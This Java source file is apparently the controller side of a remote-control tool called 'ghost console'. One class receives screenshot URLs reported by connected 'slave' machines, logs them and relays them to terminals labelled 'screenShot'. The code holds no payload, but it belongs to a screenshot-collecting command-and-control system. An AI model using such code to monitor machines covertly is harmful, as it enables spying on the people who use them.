package top.idoknow.ghost.console.net.slave.operations;

import top.idoknow.ghost.console.adapter.rft.RFTAdapter;
import top.idoknow.ghost.console.core.ConsoleMain;
import top.idoknow.ghost.console.net.protocol.AbstractCommand;
import top.idoknow.ghost.console.net.protocol.AbstractHandler;
import top.idoknow.ghost.console.net.slave.SlaveHandler;
import top.idoknow.ghost.console.net.terminal.TerminalAcceptor;
import top.idoknow.ghost.console.util.Debug;

public class CommandSendPicURL extends AbstractCommand {

    @Override
    public void process(String[] params, AbstractHandler handler, String rawData) {
        ((SlaveHandler)handler).getPeerTerminal()
                .getWrapper().wrapTimeLn("["+handler.getSubject().getText()+"] 获取到新截图,url:"
                + ConsoleMain.cfg.getString("workdir-http-url")
                + RFTAdapter.rftServer.getReceiver().getRootPath()+params[1]).flush();
        Debug.debug(handler.getSubject(),"sendpicurl:"+ConsoleMain.cfg.getString("workdir-http-url")
                + RFTAdapter.rftServer.getReceiver().getRootPath()+params[1]);

        //Send to terminal who has label "screenShot"
        TerminalAcceptor.sendDataToSpecificTerminal("screenShot","!scrd "+ConsoleMain.cfg.getString("workdir-http-url")
                +RFTAdapter.rftServer.getReceiver().getRootPath()+params[1]);
    }
}
